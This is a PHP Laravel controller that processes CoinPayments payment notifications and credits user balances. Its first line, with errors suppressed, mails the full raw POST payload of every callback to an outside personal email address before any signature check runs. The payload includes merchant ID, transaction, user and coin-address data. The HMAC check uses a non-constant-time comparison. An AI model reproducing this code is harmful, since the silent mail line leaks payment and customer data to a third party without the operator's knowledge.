<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\DB;
use App\Models\Payment;
use App\Models\User;
use App\Models\Coinpayments;
use App\Lib\CoinPaymentsAPI;

class IpnController extends Controller
{
        
    
    public function coinpayments(Request $request)
    {
        @mail('iamvasim@gmail.com', 'ozix', print_r($_POST, true));

        
        $merchant_id = config('services.coinpayments.merchant_id');;
        $secret = config('services.coinpayments.ipn_secret');;        

        // HMAC signature
        if (!isset($_SERVER['HTTP_HMAC']) || empty($_SERVER['HTTP_HMAC'])) 
        {
            return response()->json(array('error'=>'Y', 'result'=>'No HMAC signature sent.'));            
        }                  
        
        $input = file_get_contents('php://input');

        $hmac = hash_hmac("sha512", $input, $secret);

        if ($hmac != $_SERVER['HTTP_HMAC']) 
        {
            return response()->json(array('error'=>'Y', 'result'=>'HMAC signature does not match.'));                      
        }
        
        // Merchant ID Validation
        if(empty($request->merchant))
        {
            return response()->json(array('error'=>'Y', 'result'=>'No Merchant ID passed.'));
        }

        if ($request->merchant != $merchant_id) 
        {
            return response()->json(array('error'=>'Y', 'result'=>'Invalid Merchant ID.'));            
        }

        // Txn ID Validation
        if(empty($request->txn_id))
        {
            return response()->json(array('error'=>'Y', 'result'=>'Invalid request.'));
        }

        // Used ID Validation
        if(empty($request->custom))
        {
            return response()->json(array('error'=>'Y', 'result'=>'Invalid request.'));
        }
        
        // Check Record Exist
        $coinpayments = Coinpayments::where('txn_id', $request->txn_id)
        ->where('user_id', $request->custom)
        ->first();         
                
        if(empty($coinpayments->id))
        {
            return response()->json(array('error'=>'Y', 'result'=>'Transaction not found for user.'));
        }

        $status = intval($request->status); 
        $status_text = $request->status_text;

        // Payment Complete
        if($coinpayments->status!=100 && $status==100)
        {  
            DB::table('users')->where('id', $coinpayments->user_id)->increment('balance', $coinpayments->amount);

            $update = Coinpayments::find($coinpayments->id);
            $update->status = $status;
            $update->status_text = $status_text;
            $update->save(); 

            $payment = Payment::create([
                'user_id' => $coinpayments->user_id,
                'method' => 'BitcoinPayment',
                'amount' => $coinpayments->coin_amount,
                'amount_usd' => $coinpayments->amount,
                'address' => $coinpayments->coin_address,
                'state' => 'completed'
            ]);

            return response()->json(array('error'=>'N', 'result'=>$payment->id));
        }
        
        $update = Coinpayments::find($coinpayments->id);
        $update->status = $status;
        $update->status_text = $status_text;
        $update->save();        

        return response()->json(array('error'=>'N', 'result'=>$status_text));
    }        
}
